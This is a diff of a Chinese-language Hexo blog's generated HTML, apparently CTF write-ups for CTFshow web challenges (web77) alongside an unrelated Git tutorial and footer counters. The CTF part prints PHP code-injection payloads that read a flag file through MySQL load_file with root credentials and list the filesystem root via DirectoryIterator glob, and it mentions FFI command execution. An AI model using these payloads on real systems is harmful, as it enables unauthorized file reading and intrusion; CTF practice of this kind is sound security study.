+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;<span class="variable">$dbh</span> = new PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);foreach(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) as <span class="variable">$row</span>) &#123;echo(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = null;&#125;catch (PDOException <span class="variable">$e</span>) &#123;echo <span class="variable">$e</span> -&gt; getMessage();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h2><p>使用上面的方法得到<img src="/2022/03/08/CTFshow-2/image-20220220190908376.png" alt="image-20220220190908376"></p>
-<p>c=?&gt;&lt;?php $a=new DirectoryIterator(“glob:///*”); foreach($a as $f){</p>
-<p>echo($f-&gt;__toString().’ ‘);} exit() ?&gt;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>() <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>读取目录：flag36x.txt是上面图片的内容，还有一个readflag文件</p>
 <p><img src="/2022/03/08/CTFshow-2/image-20220220190951090.png" alt="image-20220220190951090"></p>
 <p>还是常使用POD读取flag36x.php但是失败了，根据提示使用PHP7.4以上才有的FFI进行命令执行</p>
@@ -2920,7 +2827,7 @@ php版本 &lt; php 5.3.4
 <p><img src="/2022/02/22/Git/image-20220224145200959.png" alt="image-20220224145200959"></p>
 <p><img src="/2022/02/22/Git/image-20220224145410299.png" alt="image-20220224145410299"></p>
 <p>就可以git pull SSH</p>
-<p>例如：git pull <a href="mailto:&#103;&#x69;&#116;&#64;&#x67;&#x69;&#116;&#104;&#117;&#x62;&#x2e;&#99;&#x6f;&#109;">&#103;&#x69;&#116;&#64;&#x67;&#x69;&#116;&#104;&#117;&#x62;&#x2e;&#99;&#x6f;&#109;</a>:cjtyx/git-demo.git</p>
+<p>例如：git pull <a href="mailto:&#x67;&#105;&#x74;&#x40;&#x67;&#x69;&#116;&#104;&#117;&#x62;&#46;&#x63;&#111;&#x6d;">&#x67;&#105;&#x74;&#x40;&#x67;&#x69;&#116;&#104;&#117;&#x62;&#46;&#x63;&#111;&#x6d;</a>:cjtyx/git-demo.git</p>
 <h1 id="第七章-IDEA集成Git"><a href="#第七章-IDEA集成Git" class="headerlink" title="第七章 IDEA集成Git"></a>第七章 IDEA集成Git</h1><h2 id="7-1-配置Git忽略文件"><a href="#7-1-配置Git忽略文件" class="headerlink" title="7.1 配置Git忽略文件"></a>7.1 配置Git忽略文件</h2><p>idea 特定文件，让git忽略</p>
 <p><img src="/2022/02/22/Git/image-20220224151555215.png" alt="image-20220224151555215"></p>
 <p>问题1：为什么要忽略他们？</p>
@@ -4835,13 +4742,13 @@ php版本 &lt; php 5.3.4
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="Symbols count total">111k</span>
+    <span title="Symbols count total">119k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">1:40</span>
+    <span title="Reading time total">1:48</span>
   </span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
